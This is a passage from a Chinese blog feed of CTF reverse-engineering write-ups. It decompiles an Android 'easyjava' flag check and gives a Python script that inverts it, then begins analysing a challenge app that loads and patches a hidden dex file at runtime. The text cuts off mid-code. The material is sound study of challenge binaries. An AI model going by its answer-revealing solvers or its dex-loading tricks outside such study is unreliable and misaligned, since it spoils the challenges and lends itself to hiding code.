class="number">2000L</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>基本的验证如下</p>
<blockquote>
<p>验证加密后的结果是否等于wigwrkaugala</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">m6a</span><span class="params">(String str, C0680b c0680b, C0679a c0679a)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> c0679a.m3a(c0680b.m1a(str));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title function_">m5b</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (str.startsWith(<span class="string">&quot;flag&#123;&quot;</span>) &amp;&amp; str.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">substring</span> <span class="operator">=</span> str.substring(<span class="number">5</span>, str.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="type">C0680b</span> <span class="variable">c0680b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C0680b</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="type">C0679a</span> <span class="variable">c0679a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C0679a</span>(<span class="number">3</span>);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; substring.length(); i2++) &#123;</span><br><span class="line">                sb.append(m6a(substring.charAt(i2) + <span class="string">&quot;&quot;</span>, c0680b, c0679a));</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">valueOf</span> <span class="operator">=</span> Integer.valueOf(c0680b.m0b().intValue() / <span class="number">25</span>);</span><br><span class="line">                <span class="keyword">if</span> (valueOf.intValue() &gt; i &amp;&amp; valueOf.intValue() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(sb.toString().equals(<span class="string">&quot;wigwrkaugala&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>其第一个调用的是<code>c0680b.m1a(str)</code>第二个调用的是<code>c0679a.m3a</code>,逆算法先从最后一个开始逆起</p>
<blockquote>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&gt;<span class="keyword">package</span> com.p027a.easyjava;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">/* renamed from: com.a.easyjava.a */</span></span><br><span class="line">&gt;<span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C0679a</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: a */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;Integer&gt; f2482a = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: b */</span></span><br><span class="line">   <span class="keyword">static</span> <span class="type">String</span> <span class="variable">f2483b</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: d */</span></span><br><span class="line">   <span class="keyword">static</span> <span class="type">Integer</span> <span class="variable">f2484d</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   Integer[] f2485c = &#123;<span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">C0679a</span><span class="params">(Integer num)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">intValue</span> <span class="operator">=</span> num.intValue(); intValue &lt; <span class="built_in">this</span>.f2485c.length; intValue++) &#123;</span><br><span class="line">           f2482a.add(<span class="built_in">this</span>.f2485c[intValue]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num.intValue(); i++) &#123;</span><br><span class="line">           f2482a.add(<span class="built_in">this</span>.f2485c[i]); <span class="comment">// [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7 , 14 , 16]</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//这个方法只有在数据长度大于等于25的时候才有用所以省略掉</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m4a</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: a */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">m3a</span><span class="params">(Integer num)</span> &#123;</span><br><span class="line">       <span class="type">Integer</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span> (num.intValue() == -<span class="number">10</span>) &#123;<span class="comment">//因为最后的验证结果中没有&quot; &quot;所以可以直接跳过这个if语句</span></span><br><span class="line">           m4a();</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.charAt(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; f2482a.size() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">           <span class="keyword">if</span> (f2482a.get(i) == num) &#123;</span><br><span class="line">               num2 = Integer.valueOf(i);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       m4a();</span><br><span class="line">       <span class="keyword">return</span> f2483b.charAt(num2.intValue());</span><br><span class="line">   &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></div>

<p>m3a这个方法基本上就可以逆向算了，最后的返回结果就是<code>f2483b[f2485c.indexof(num)]</code>在python方法中逆回去就是</p>
<p><code>f2485c[f2483b.find(ret)]</code></p>
<p>而<code>c0680b.m1a(char)</code>方法如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&gt;<span class="keyword">package</span> com.p027a.easyjava;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">/* renamed from: com.a.easyjava.b */</span></span><br><span class="line">&gt;<span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C0680b</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: a */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;Integer&gt; f2486a = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: b */</span></span><br><span class="line">   <span class="keyword">static</span> <span class="type">String</span> <span class="variable">f2487b</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: d */</span></span><br><span class="line">   <span class="keyword">static</span> <span class="type">Integer</span> <span class="variable">f2488d</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: c */</span></span><br><span class="line">   Integer[] f2489c = &#123;<span class="number">8</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">C0680b</span><span class="params">(Integer num)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">intValue</span> <span class="operator">=</span> num.intValue(); intValue &lt; <span class="built_in">this</span>.f2489c.length; intValue++) &#123;</span><br><span class="line">           f2486a.add(<span class="built_in">this</span>.f2489c[intValue]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num.intValue(); i++) &#123;</span><br><span class="line">           f2486a.add(<span class="built_in">this</span>.f2489c[i]); <span class="comment">// 传入的num为2 所以f2489c第一次运行的情况下是[17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13,8,25]</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: a */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m2a</span><span class="params">()</span> &#123;<span class="comment">//这个每运行一步都会改变f2489c，f2487b</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">intValue</span> <span class="operator">=</span> f2486a.get(<span class="number">0</span>).intValue();</span><br><span class="line">       f2486a.remove(<span class="number">0</span>);</span><br><span class="line">       f2486a.add(Integer.valueOf(intValue));</span><br><span class="line">       f2487b += <span class="string">&quot;&quot;</span> + f2487b.charAt(<span class="number">0</span>);</span><br><span class="line">       f2487b = f2487b.substring(<span class="number">1</span>, <span class="number">27</span>);</span><br><span class="line">       <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> f2488d;</span><br><span class="line">       f2488d = Integer.valueOf(f2488d.intValue() + <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: a */</span></span><br><span class="line">   <span class="keyword">public</span> Integer <span class="title function_">m1a</span><span class="params">(String str)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span> (f2487b.contains(str.toLowerCase())) &#123;</span><br><span class="line">           <span class="type">Integer</span> <span class="variable">valueOf</span> <span class="operator">=</span> Integer.valueOf(f2487b.indexOf(str));</span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; f2486a.size() - <span class="number">1</span>; i2++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (f2486a.get(i2) == valueOf) &#123;</span><br><span class="line">                   i = Integer.valueOf(i2);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           i = str.contains(<span class="string">&quot; &quot;</span>) ? -<span class="number">10</span> : -<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       m2a();</span><br><span class="line">       <span class="keyword">return</span> i;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* renamed from: b */</span></span><br><span class="line">   <span class="keyword">public</span> Integer <span class="title function_">m0b</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> f2488d;</span><br><span class="line">   &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></div>

<p>此处可以建议概括返回值为<code>f2486a.indexOf(f2487b.indexOf(str))</code>，所以python中可以逆解为<code>f2487b[f2486a[ret]]</code></p>
</blockquote>
</blockquote>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">f2487b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">f2489c = [<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>,<span class="number">8</span>,<span class="number">25</span>]</span><br><span class="line">f2483b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">f2485c = [<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>,<span class="number">14</span>,<span class="number">16</span>]</span><br><span class="line">str1=<span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">tmp1=<span class="string">&#x27;wigwrkaugala&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp1:</span><br><span class="line">    str1+=f2487b[f2489c[f2485c[(f2483b.find(i))]]]</span><br><span class="line">    f2487b=f2487b[<span class="number">1</span>:]+f2487b[<span class="number">0</span>]</span><br><span class="line">    f2489c=f2489c[<span class="number">1</span>:]+f2489c[:<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(str1+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>得到了flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202308100157017.png"
                      alt="image-20230810015715953"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>柏鹭杯 2021不重要的图形</title>
    <url>/2023/07/26/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E6%9F%8F%E9%B9%AD%E6%9D%AF%202021%E4%B8%8D%E9%87%8D%E8%A6%81%E7%9A%84%E5%9B%BE%E5%BD%A2/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://www.nssctf.cn/problem/1263" >柏鹭杯 2021]不重要的图形 | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.octobox.ctf&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.MyApplication&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.octobox.ctf.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>只有一个主类</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">  </span><br><span class="line">        <span class="comment">/**********************做完后表示以上函数为障眼法***************************************/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Log.i(<span class="string">&quot;MainAct&quot;</span>, stringBuffer.toString());</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">open</span> <span class="operator">=</span> getAssets().open(<span class="string">&quot;classes.dex&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[open.available()];</span><br><span class="line">            open.read(bArr);</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getDir(<span class="string">&quot;data&quot;</span>, <span class="number">0</span>), <span class="string">&quot;decode.dex&quot;</span>);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            fileOutputStream.write(bArr);</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            open.close();</span><br><span class="line">            <span class="keyword">if</span> (checkPassword(stringBuffer.toString().toUpperCase(), file)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.unlockView.setVisibility(<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.handler.sendEmptyMessageDelayed(<span class="number">0</span>, <span class="number">2000L</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="comment">//将asset的classes.dex复制到data路径中的&quot;decode.dex&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkPassword</span><span class="params">(String password, File loadDex)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">declaredMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(loadDex.getAbsolutePath(), getDir(<span class="string">&quot;dex&quot;</span>, <span class="number">0</span>).getAbsolutePath(), <span class="literal">null</span>, getClass().getClassLoader()).loadClass(<span class="string">&quot;C&quot;</span>).getDeclaredMethod(<span class="string">&quot;isValidate&quot;</span>, Context.class, String.class, <span class="type">int</span>[].class);</span><br><span class="line">            <span class="type">int</span>[] intArray = getResources().getIntArray(C0652R.array.A_offset);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) declaredMethod.invoke(<span class="literal">null</span>, <span class="built_in">this</span>, password, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, intArray[<span class="number">0</span>], intArray[<span class="number">1</span>]&#125;); <span class="comment">// 3,3248</span></span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, str);</span><br><span class="line">            <span class="keyword">if</span> (str != <span class="literal">null</span> &amp;&amp; str.startsWith(<span class="string">&quot;Great!&quot;</span>)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.tvText.setText(str);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p>上面的intArray通过getResources().getIntArray(C0652R.array.A_offset);方法从res中取出了{3,3248}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307260245646.png"
                      alt="image-20230726024308945"
                ></p>
<p>注意此处的B_offset，以后要用</p>
<p>同时上面方法的通过反射机制调用了静态方法isValidate，并将最后结果传给了str</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">declaredMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(loadDex.getAbsolutePath(), getDir(<span class="string">&quot;dex&quot;</span>, <span class="number">0</span>).getAbsolutePath(), <span class="literal">null</span>, getClass().getClassLoader()).loadClass(<span class="string">&quot;C&quot;</span>).getDeclaredMethod(<span class="string">&quot;isValidate&quot;</span>, Context.class, String.class, <span class="type">int</span>[].class);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) declaredMethod.invoke(<span class="literal">null</span>, <span class="built_in">this</span>, password, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, intArray[<span class="number">0</span>], intArray[<span class="number">1</span>]&#125;); <span class="comment">// 3,3248</span></span><br></pre></td></tr></table></figure></div>

<p>isValidate方法(包括其调用的方法)如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">isValidate</span><span class="params">(Context context, String password, <span class="type">int</span>[] original)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteBuffer read;</span><br><span class="line">        File fix;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;start check password&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (original.length != <span class="number">3</span> || (read = read(context)) == <span class="literal">null</span> || (fix = fix(read, original[<span class="number">0</span>], original[<span class="number">1</span>], original[<span class="number">2</span>], context)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> context.getClass().getClassLoader();</span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> context.getDir(<span class="string">&quot;fixed&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(fix.getAbsolutePath(), dir.getAbsolutePath(), <span class="literal">null</span>, classLoader).loadClass(<span class="string">&quot;A&quot;</span>).getDeclaredMethod(<span class="string">&quot;d&quot;</span>, Context.class, String.class).invoke(<span class="literal">null</span>, context, password);</span><br><span class="line">        fix.delete();<span class="comment">//调用fix修复后的文件再删除fix的文件</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">File</span>(dir, fix.getName()).delete();</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">fix</span><span class="params">(ByteBuffer dexBuffer, <span class="type">int</span> classIndex, <span class="type">int</span> index, <span class="type">int</span> offset, Context context)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">signInfo</span> <span class="operator">=</span> Utils.getSignInfo(context);</span><br><span class="line">        <span class="keyword">if</span> (signInfo == <span class="literal">null</span> || !signInfo.equals(<span class="string">&quot;78856d5c90624ec05bbc3d9be63d3715fd6fefce&quot;</span>)) &#123;<span class="comment">//验证自身文件的特征值</span></span><br><span class="line">            Log.i(TAG, <span class="string">&quot;check signature failed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> context.getDir(<span class="string">&quot;data&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">intValue</span> <span class="operator">=</span> C0003D.getClassDefData(dexBuffer, classIndex).get(<span class="string">&quot;class_data_off&quot;</span>).intValue();</span><br><span class="line">        HashMap&lt;String, <span class="type">int</span>[][]&gt; classData = C0003D.getClassData(dexBuffer, intValue);</span><br><span class="line">        classData.get(<span class="string">&quot;direct_methods&quot;</span>)[index][<span class="number">2</span>] = offset;</span><br><span class="line">        <span class="type">byte</span>[] encodeClassData = C0003D.encodeClassData(classData);</span><br><span class="line">        dexBuffer.position(intValue);</span><br><span class="line">        dexBuffer.put(encodeClassData);</span><br><span class="line">        dexBuffer.position(<span class="number">32</span>);</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[dexBuffer.capacity() - <span class="number">32</span>];</span><br><span class="line">        dexBuffer.get(bArr);</span><br><span class="line">        <span class="type">byte</span>[] sha1 = Utils.getSha1(bArr);</span><br><span class="line">        dexBuffer.position(<span class="number">12</span>);</span><br><span class="line">        dexBuffer.put(sha1);</span><br><span class="line">        <span class="type">int</span> <span class="variable">checksum</span> <span class="operator">=</span> Utils.checksum(dexBuffer);</span><br><span class="line">        dexBuffer.position(<span class="number">8</span>);</span><br><span class="line">        dexBuffer.putInt(Integer.reverseBytes(checksum));</span><br><span class="line">        <span class="type">byte</span>[] array = dexBuffer.array();</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir, <span class="string">&quot;1.dex&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        fileOutputStream.write(array);</span><br><span class="line">        fileOutputStream.close();<span class="comment">//</span></span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteBuffer <span class="title function_">read</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getDir(<span class="string">&quot;data&quot;</span>, <span class="number">0</span>), <span class="string">&quot;decode.dex&quot;</span>);</span><br><span class="line">            <span 